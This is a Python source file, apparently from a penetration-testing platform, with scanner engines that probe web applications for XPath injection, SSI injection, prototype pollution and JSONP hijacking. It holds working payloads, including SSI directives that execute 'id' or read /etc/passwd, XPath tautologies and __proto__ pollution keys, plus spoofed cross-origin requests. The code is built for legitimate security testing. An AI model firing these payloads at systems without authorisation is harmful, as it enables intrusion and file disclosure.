# -*- coding: utf-8 -*-
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 VULNCLAW Authors (see README & LICENSE)
# This file is part of VULNCLAW / pentest_platform.
# Licensed under GNU Affero General Public License v3.0 or later.

# engines/web_advanced_engines.py
"""
进阶 Web 注入引擎组（v104 新增）
XPathInjectionEngine / SSIInjectionEngine / PrototypePollutionEngine / JSONPHijackingEngine
设计原则：报错签名 + 布尔 A/B + 唯一 Token 回显，至少一段证据命中才判定，控制误报。
"""
import json
import re
import secrets
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import Dict, List, Optional, Tuple

from vulnclaw.core.logger import logger
from vulnclaw.core.settings import settings
from vulnclaw.core.utils import async_get, async_post, build_attack_url
from vulnclaw.engines.base import BaseEngine, enrich_finding


# ============================================================
# XPathInjectionEngine
# ============================================================
class XPathInjectionEngine(BaseEngine):
    """XPath 注入检测引擎（XML/XPath 后端：Java/ASP.NET/PHP SimpleXML）"""

    name = "xpath_injection"
    description = "XPath 注入检测引擎（报错回显 + 布尔盲注）"

    priority_params = [
        "id", "user", "username", "name", "search", "q", "query", "key",
        "node", "path", "xml", "filter", "category", "type", "product",
        "select", "find", "term",
    ]

    payloads: List[Tuple[str, str]] = [
        ("' or '1'='1", "OR恒真-单引号"),
        ("' and '1'='1", "AND恒真-单引号"),
        ("' and '1'='2", "AND恒假-单引号"),
        ('" or "1"="1', "OR恒真-双引号"),
        ('" and "1"="2', "AND恒假-双引号"),
        ("' or 1=1 or '", "OR恒真-闭合"),
        ("'|//*|'", "联合节点遍历"),
        ("']|//*|x['", "闭合后节点遍历"),
        ("' or count(/*)=1 or '", "布尔-根节点计数"),
        ("a' or '1'='1", "字符串前缀闭合"),
        ("1 or 1=1", "数字型恒真"),
        ("-1 or 2-1", "数字型恒真2"),
    ]

    XPATH_ERROR_PATTERNS = [
        r"System\.Xml\.XPath", r"XPathException", r"javax\.xml\.xpath",
        r"SimpleXMLElement", r"Invalid XPath expression", r"xmlXPathEval",
        r"libxml", r"DOMXPath", r"XPath error", r"XPath query",
        r"Invalid expression", r"query evaluation", r"XPathEvaluator",
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        payloads = self.reorder_payloads_by_param(param, max_count=12)
        if not any(k in param.lower() for k in self.priority_params):
            payloads = payloads[:6]  # 非疑似参数降低弹药量

        normal_text = self.get_normal_text(normal_resp) or ""
        normal_status = self.get_normal_status(normal_resp)

        for payload, desc in payloads:
            attack_url = build_attack_url(url, param, payload, parsed_query)
            try:
                resp = await async_get(attack_url, session=session, timeout=settings.timeout, no_retry=True)
                if resp is None:
                    continue
                status, text = resp[0], resp[1] or ""
            except Exception as e:
                self.log_debug(f"XPath 检测异常 {param}: {e}")
                continue

            if not isinstance(text, str):
                continue
            text_lower = text.lower()
            for sig in self.XPATH_ERROR_PATTERNS:
                sig_lower = sig.lower()
                if sig_lower in text_lower and sig_lower not in normal_text.lower():
                    finding = {
                        'url': attack_url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'XPath注入-报错回显({desc})',
                        'severity': 'High',
                        'ai_verdict': '高',
                        'confidence': 'high',
                        'evidence': f'攻击响应出现 XPath 引擎错误特征: {sig}（基线响应无此特征）',
                        'status_code': status,
                        'recommendation': '使用参数化 XPath 查询（XMLQuery/占位符），过滤引号与路径表达式字符',
                    }
                    return enrich_finding(finding)

        # 第二段：布尔盲注 A/B（仅当基线 200 且 A/B 均为 200 时采信，避免错误页噪音）
        if normal_status == 200:
            ab = await self.ab_verify(
                url, param, "' and '1'='1", "' and '1'='2",
                parsed_query, session, normal_resp
            )
            if ab.get("verified"):
                if ab.get("status_a") == 200 and ab.get("status_b") == 200:
                    finding = {
                        'url': ab.get("url_a") or url,
                        'parameter': param,
                        'payload': "' and '1'='1 / ' and '1'='2",
                        'type': 'XPath注入-布尔盲注(A/B差异)',
                        'severity': 'Medium',
                        'ai_verdict': '中',
                        'confidence': 'medium',
                        'evidence': ab.get("evidence", "A/B 响应差异"),
                        'recommendation': '使用参数化 XPath 查询，黑白名单校验输入',
                    }
                    return enrich_finding(finding)
                self.log_debug(f"XPath A/B 差异疑似噪音（状态码 {ab.get('status_a')}/{ab.get('status_b')}），放弃")
        return None


# ============================================================
# SSIInjectionEngine
# ============================================================
class SSIInjectionEngine(BaseEngine):
    """SSI（Server-Side Include）注入检测引擎"""

    name = "ssi_injection"
    description = "SSI 注入检测引擎（Token 报错回显 + DATE_LOCAL 回显 + /etc/passwd 包含）"

    priority_params = [
        "page", "file", "template", "tpl", "include", "name", "path",
        "lang", "dir", "view", "section", "load",
    ]

    payloads: List[Tuple[str, str]] = [
        ("<!--#exec cmd=\"id\"-->", "命令执行-id"),
        ("<!--#exec cmd=\"cat /etc/passwd\"-->", "命令执行-passwd"),
        ("<!--#include virtual=\"/etc/passwd\"-->", "文件包含-passwd"),
        ("<!--#include file=\"/etc/passwd\"-->", "文件包含-file"),
        ("<!--#echo var=\"DATE_LOCAL\"-->", "回显-DATE_LOCAL"),
        ("<!--#echo var=\"DOCUMENT_NAME\"-->", "回显-文档名"),
        ("<!--#printenv -->", "回显-环境变量"),
    ]

    UNIX_PASSWD_RE = re.compile(r"root:[x*]?:0:0:")
    DATE_LOCAL_RE = re.compile(
        r"\b(?:Mon|Tue|Wed|Thu|Fri|Sat|Sun)[a-z]{2,5}, \d{2}-[A-Z][a-z]{2}-\d{4} \d{2}:\d{2}:\d{2}", re.I
    )
    SSI_ERROR_RE = re.compile(
        r"\[an error occurred while processing this directive\]", re.I
    )

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        if not param:
            return None
        normal_text = self.get_normal_text(normal_resp) or ""
        token = "vlcssi" + secrets.token_hex(4)

        # 第一段：唯一 Token 验证 —— 服务器执行了自定义 errmsg 指令即证明 SSI 被解析
        token_payload = f"<!--#config errmsg=\"{token}\"--><!--#exec cmd=\"vlc_no_such_cmd_{token}\"-->"
        token_url = build_attack_url(url, param, token_payload, parsed_query)
        try:
            resp = await async_get(token_url, session=session, timeout=settings.timeout, no_retry=True)
            if resp is not None:
                status, text = resp[0], resp[1] or ""
                if isinstance(text, str) and token in text and token not in normal_text:
                    finding = {
                        'url': token_url,
                        'parameter': param,
                        'payload': token_payload,
                        'type': 'SSI注入-Token报错回显',
                        'severity': 'High',
                        'ai_verdict': '高',
                        'confidence': 'high',
                        'evidence': f'注入的 errmsg Token `{token}` 被服务器解析并回显（唯一Token三段式验证）',
                        'status_code': status,
                        'recommendation': '禁用/剥离用户输入中的 SSI 指令，或关闭 SSI 解析',
                    }
                    return enrich_finding(finding)
        except Exception as e:
            self.log_debug(f"SSI Token 验证异常: {e}")

        payloads = self.reorder_payloads_by_param(param, max_count=7)
        for payload, desc in payloads:
            attack_url = build_attack_url(url, param, payload, parsed_query)
            try:
                resp = await async_get(attack_url, session=session, timeout=settings.timeout, no_retry=True)
                if resp is None:
                    continue
                status, text = resp[0], resp[1] or ""
            except Exception as e:
                self.log_debug(f"SSI 检测异常 {param}: {e}")
                continue

            if not isinstance(text, str):
                continue

            if self.UNIX_PASSWD_RE.search(text) and not self.UNIX_PASSWD_RE.search(normal_text):
                finding = {
                    'url': attack_url, 'parameter': param, 'payload': payload,
                    'type': f'SSI注入-任意文件读取({desc})', 'severity': 'High',
                    'ai_verdict': '高', 'confidence': 'high',
                    'evidence': '攻击响应出现 Unix passwd 文件特征(root:x:0:0:)，基线响应无此特征',
                    'status_code': status,
                    'recommendation': '禁用 SSI 解析或严格过滤 SSI 指令语法',
                }
                return enrich_finding(finding)

            if self.DATE_LOCAL_RE.search(text) and not self.DATE_LOCAL_RE.search(normal_text):
                finding = {
                    'url': attack_url, 'parameter': param, 'payload': payload,
                    'type': f'SSI注入-Date回显({desc})', 'severity': 'High',
                    'ai_verdict': '高', 'confidence': 'high',
                    'evidence': '响应出现 SSI DATE_LOCAL 格式回显，且基线响应无此特征',
                    'status_code': status,
                    'recommendation': '禁止将用户输入拼接进 SSI 模板',
                }
                return enrich_finding(finding)

            if self.SSI_ERROR_RE.search(text) and not self.SSI_ERROR_RE.search(normal_text):
                finding = {
                    'url': attack_url, 'parameter': param, 'payload': payload,
                    'type': f'SSI注入-指令解析报错({desc})', 'severity': 'Medium',
                    'ai_verdict': '中', 'confidence': 'medium',
                    'evidence': '响应出现 SSI 解析错误特征 "[an error occurred while processing this directive]"',
                    'status_code': status,
                    'recommendation': '禁用 SSI 解析或过滤 SSI 指令',
                }
                return enrich_finding(finding)
        return None


# ============================================================
# PrototypePollutionEngine
# ============================================================
class PrototypePollutionEngine(BaseEngine):
    """原型链污染检测引擎（Node/Express 优先；黑盒保守判定）

    说明：黑盒环境原型污染难以直接验证，本引擎采用保守策略——
    仅当注入键名携带的唯一 Token 被回显（且基线无）时上报，标注需人工复核。
    """

    name = "prototype_pollution"
    description = "原型链污染检测引擎（查询串 __proto__/constructor 向量，保守判定）"

    priority_params = [
        "config", "option", "settings", "setting", "filter", "query", "json",
        "data", "param", "params", "obj", "payload",
    ]

    payloads: List[Tuple[str, str]] = [
        ("__proto__[polluted]=vlcpp", "proto-polluted-数组"),
        ("__proto__.polluted=vlcpp", "proto-polluted-点号"),
        ("constructor[prototype][polluted]=vlcpp", "constructor-prototype"),
        ("constructor.prototype.polluted=vlcpp", "constructor-prototype-点号"),
        ("__proto__[polluted][0]=vlcpp", "proto-polluted-嵌套数组"),
        ("[__proto__][polluted]=vlcpp", "proto-方括号键"),
    ]

    # JSON 体污染向量（Node/Express body-parser 为主战场，原引擎零覆盖）
    json_payloads: List[Tuple[Dict, str]] = [
        ({"__proto__": {"polluted": "vlcpp"}}, "json-__proto__"),
        ({"constructor": {"prototype": {"polluted": "vlcpp"}}}, "json-constructor.prototype"),
        ({"__proto__": {"constructor": {"prototype": {"polluted": "vlcpp"}}}}, "json-deep"),
        ({"data": 1, "__proto__": {"polluted": "vlcpp"}}, "json-__proto__+字段"),
    ]

    def _build_query_url(self, url: str, param: str, key_payload: str, marker_value: str) -> str:
        """把 payload 模板中的 vlcpp 替换成唯一 marker 后写入查询串。"""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        qs[param] = [key_payload.replace("vlcpp", marker_value)]
        new_query = urlencode(qs, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        normal_text = self.get_normal_text(normal_resp) or ""
        marker = "vlc_polluted_" + secrets.token_hex(6)
        proto_hint = re.compile(r"(?:__proto__|prototype\s*[:=]|\[object Object\])", re.I)

        # 1) 查询串向量（param 驱动，保留原保守判定）
        if param:
            for template, desc in self.payloads:
                attack_url = self._build_query_url(url, param, template, marker)
                try:
                    resp = await async_get(attack_url, session=session, timeout=settings.timeout, no_retry=True)
                    if resp is None:
                        continue
                    status, text = resp[0], resp[1] or ""
                except Exception as e:
                    self.log_debug(f"原型污染检测异常 {param}: {e}")
                    continue

                if not isinstance(text, str):
                    continue
                if marker not in text or marker in normal_text:
                    continue
                if proto_hint.search(text):
                    finding = self._make_finding(attack_url, param, f"{template}(value={marker})", desc, "Low", "low", status)
                    verified = await self._verify_pollution(url, marker, normal_text, session)
                    if verified:
                        finding = self._upgrade(finding, verified)
                    return enrich_finding(finding)

        # 2) JSON 体向量（Node/Express body-parser 为主战场，原引擎零覆盖）
        for body_tmpl, desc in self.json_payloads:
            body = self._fill_marker(body_tmpl, marker)
            try:
                resp = await async_post(
                    url, json=body, headers={"Content-Type": "application/json"},
                    session=session, timeout=settings.timeout, no_retry=True,
                )
                status = resp[0] if resp else 0
            except Exception as e:
                self.log_debug(f"原型污染(JSON)检测异常: {e}")
                continue
            # JSON 注入难以在响应直接回显，依赖落地验证（二次请求看 marker 是否泄漏）
            verified = await self._verify_pollution(url, marker, normal_text, session)
            if verified:
                finding = self._make_finding(url, param or "(json-body)", f"JSON {desc}(value={marker})", desc, "Medium", "medium", status)
                finding = self._upgrade(finding, verified)
                return enrich_finding(finding)
        return None

    def _fill_marker(self, tmpl: Dict, marker: str) -> Dict:
        """把模板 JSON 中的 vlcpp 占位符替换为唯一 marker。"""
        return json.loads(json.dumps(tmpl).replace("vlcpp", marker))

    def _make_finding(self, url, param, payload, desc, severity, confidence, status) -> Dict:
        return {
            'url': url,
            'parameter': param,
            'payload': payload,
            'type': f'原型链污染-疑似({desc})',
            'severity': severity,
            'ai_verdict': '中' if severity in ('Low', 'Medium') else '高',
            'confidence': confidence,
            'evidence': f'注入键值 `{payload}` 触发原型链污染特征（黑盒局限，需人工/白盒复核）',
            'status_code': status,
            'recommendation': '对 JSON/查询解析后的对象做键名白名单过滤（拒绝 __proto__/constructor/prototype），并使用 Object.create(null) 存储',
        }

    def _upgrade(self, finding: Dict, verified_url: str) -> Dict:
        finding['severity'] = 'Medium'
        finding['ai_verdict'] = '高'
        finding['confidence'] = 'medium'
        finding['type'] = finding['type'].replace('疑似', '已验证')
        finding['evidence'] = (finding.get('evidence', '') +
            f'；落地验证：污染 marker 在后续请求 `{verified_url}` 响应中复现，'
            f'说明属性已通过原型链泄漏，污染成立可能性高')
        return finding

    async def _verify_pollution(self, url: str, marker: str, normal_text: str, session) -> Optional[str]:
        """落地验证（A6 核心补强）：注入后再次请求目标/常见 API 路径，
        若唯一 marker 出现在非基线响应中，说明污染属性已借原型链泄漏到后续响应（强证据）。
        无泄漏则返回 None，不误报。"""
        parsed = urlparse(url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        probes = [url, origin + "/api", origin + "/api/user", origin + "/api/me"]
        for p in probes:
            try:
                resp = await async_get(p, session=session, timeout=settings.timeout, no_retry=True)
            except Exception:
                continue
            if not resp:
                continue
            text = resp[1] or ""
            if not isinstance(text, str):
                continue
            if marker in text and marker not in normal_text:
                return p
        return None


# ============================================================
# JSONPHijackingEngine
# ============================================================
class JSONPHijackingEngine(BaseEngine):
    """JSONP 数据劫持检测引擎（scan 型）

    检测 JSONP 端点 + 返回数据敏感性，输出数据劫持风险。
    """

    name = "jsonp_hijacking"
    description = "JSONP 数据劫持检测引擎（Callback 反射 + 敏感字段分析）"

    SENSITIVE_KEY_RE = re.compile(
        r"(?:email|mail|phone|mobile|tel|password|passwd|secret|token|access_token|"
        r"id_card|idcard|identity|balance|money|salary|address|real_name|realname|"
        r"bank|credit|ssn|身份证|手机号|邮箱|密码|余额)",
        re.I,
    )

    MAX_BODY_PARSE = 65536

    @staticmethod
    def _append_param(url: str, key: str, value: str) -> str:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        qs[key] = [value]
        new_query = urlencode(qs, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
        findings: List[Dict] = []
        try:
            callback = "vlcjsp" + secrets.token_hex(4)
            for cb_key in ("callback", "jsonp"):
                probe_url = self._append_param(target, cb_key, callback)
                resp = await async_get(probe_url, session=session, timeout=settings.timeout, no_retry=True)
                if resp is None:
                    continue
                status, text = resp[0], resp[1] or ""
                if status != 200 or not isinstance(text, str):
                    continue
                stripped = text.lstrip()
                body = None
                prefix = f"{callback}("
                if stripped.startswith(prefix):
                    body = stripped[len(prefix):]
                elif stripped.startswith("/**/" + prefix):
                    body = stripped[len("/**/" + prefix):]
                else:
                    continue

                if body.rstrip().endswith((")", ");")):
                    body = body.rstrip()[:-1]

                sensitive = bool(self.SENSITIVE_KEY_RE.search(body[: self.MAX_BODY_PARSE]))
                evidence = f'端点以 Callback `{callback}` 回显 JSONP：`{stripped[:120]}`'

                if sensitive:
                    # B11 深化：跨域 Referer/Origin 校验检测 —— 带恶意出处请求，
                    # 若仍返回含敏感字段的真实数据（未拦截），则数据劫持确证（弱校验 -> High）。
                    referer_checked = await self._probe_cross_origin_guard(
                        probe_url, callback, session
                    )
                    if referer_checked is True:
                        findings.append({
                            'url': probe_url,
                            'parameter': cb_key,
                            'payload': callback,
                            'type': 'JSONP数据劫持(无跨域校验/已确证)',
                            'severity': 'High',
                            'ai_verdict': '高',
                            'confidence': 'high',
                            'evidence': (evidence + '；且带恶意跨域 Referer/Origin 请求仍返回含敏感字段的真实 JSONP，'
                                        '说明服务端未做跨域出处校验，可被任意第三方页面跨域读取'),
                            'recommendation': 'JSONP 接口必须校验 Referer/Origin 白名单，或改用 CORS + 凭证（SameSite）策略并移除敏感字段',
                        })
                    else:
                        findings.append({
                            'url': probe_url,
                            'parameter': cb_key,
                            'payload': callback,
                            'type': 'JSONP数据劫持风险(敏感数据,有出处校验)',
                            'severity': 'Medium',
                            'ai_verdict': '中',
                            'confidence': 'medium',
                            'evidence': evidence + '，且返回敏感字段；但带跨域出处请求已校验，请人工复核不受限面',
                            'recommendation': '确认 Referer/Origin 校验规则强度，如可被伪造则升级处置',
                        })
                else:
                    findings.append({
                        'url': probe_url,
                        'parameter': cb_key,
                        'payload': callback,
                        'type': 'JSONP端点存在(信息)',
                        'severity': 'Low',
                        'ai_verdict': '中',
                        'confidence': 'high',
                        'evidence': evidence + '，未检出敏感字段，请人工确认返回内容敏感性与 Referer 校验',
                        'recommendation': '确认 JSONP 返回内容是否敏感，如敏感则禁用 JSONP 或做 Referer 校验',
                    })
        except Exception as e:
            logger.debug(f"[{self.name}] JSONP 检测异常: {e}")
        return findings

    async def _probe_cross_origin_guard(
        self, probe_url: str, callback: str, session
    ):
        """B11 深化：以恶意跨域 Referer + Origin 重新请求 JSONP 端点，判断是否做了出处校验。

        返回三种分类：
        - True  跨域请求仍返回真实 JSONP（未校验）-> 数据劫持确证
        - False 跨域请求被校验拦截/改写（403/错误/不含 callback）-> 有出处校验
        - None  探测异常或无法判定
        """
        evil_ref = "https://evil-vlccsp.example.com/"
        evil_origin = "https://evil-vlccsp.example.com"
        try:
            resp = await async_get(
                probe_url, headers={"Referer": evil_ref, "Origin": evil_origin},
                session=session, timeout=settings.timeout, no_retry=True,
            )
            if resp is None:
                return None
            status, text = resp[0], resp[1] or ""
            if not isinstance(text, str):
                return None
            if status in (403, 401, 451):
                return False
            stripped = text.lstrip()
            if f"{callback}(" in stripped:
                return True
            if self.SENSITIVE_KEY_RE.search(text[: self.MAX_BODY_PARSE]):
                return True
            low = text.lower()
            if any(k in low for k in ("forbidden", "invalid referer", "invalid origin",
                                      "not allowed", "access denied", "csrf")):
                return False
            return None
        except Exception as e:
            logger.debug(f"[{self.name}] 跨域校验探测异常: {e}")
            return None

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        return None


__all__ = [
    'XPathInjectionEngine',
    'SSIInjectionEngine',
    'PrototypePollutionEngine',
    'JSONPHijackingEngine',
]